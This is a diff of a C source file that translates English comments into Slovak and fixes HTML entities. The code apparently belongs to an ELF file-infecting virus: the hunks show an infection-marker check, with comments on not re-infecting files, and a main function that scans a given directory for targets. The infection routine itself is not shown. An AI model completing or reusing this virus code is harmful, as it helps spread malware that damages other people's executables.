@@ -23,9 +23,9 @@ static int magic = MAGIC;
 //return 2 if virus found
 int detect(char *filename, int hd)
 {
-    //handle for temp file
+    //handle pre docasny subor
    int fd;
-   //file info
+   //info subore
    struct stat stat;
    char *data;
    char tmpfile[MAX_BUF];
@@ -35,14 +35,14 @@ int detect(char *filename, int hd)
    Elf32_Ehdr ehdr;
 
 
-/* check for magic(virus identificator) at the end of the file */
-   if(fstat(hd, &amp;stat) &lt; 0) return 1;
+/* kontrola magic(identifikator virusu) na konci suboru */
+   if(fstat(hd, &stat) < 0) return 1;
    magicloc = stat.st_size - sizeof(magic);
    if( lseek(hd, magicloc, SEEK_SET) != magicloc ) return 1;
 
-   //load magic character
-   if(read(hd, &amp;tmagic, sizeof(magic)) != sizeof(magic)) return 1;
-   //if file is infected, do not infect again
+   //nacitanie magic znaku, infikovanosti
+   if(read(hd, &tmagic, sizeof(magic)) != sizeof(magic)) return 1;
+   //ak je subor infikovany, znova neinfikuje
    if(tmagic == MAGIC) return 2;
    if(lseek(hd, 0, SEEK_SET) != 0) exit(1);
 
@@ -92,12 +92,12 @@ void scan_dir(char *directory)
 int main(int argc, char *argv[], char *envp[])
 {
   
-   if (argc &lt; 2) {
+   if (argc < 2) {
    	printf("Pouzitie %s adresar\n",argv[0]);
 	exit(1);
    }
    printf("Prehladavam adresar %s\n",argv[1]); 
-   //scan directory
+   //prehladanie adresara
    scan_dir(argv[1]);
    return 0;
 }
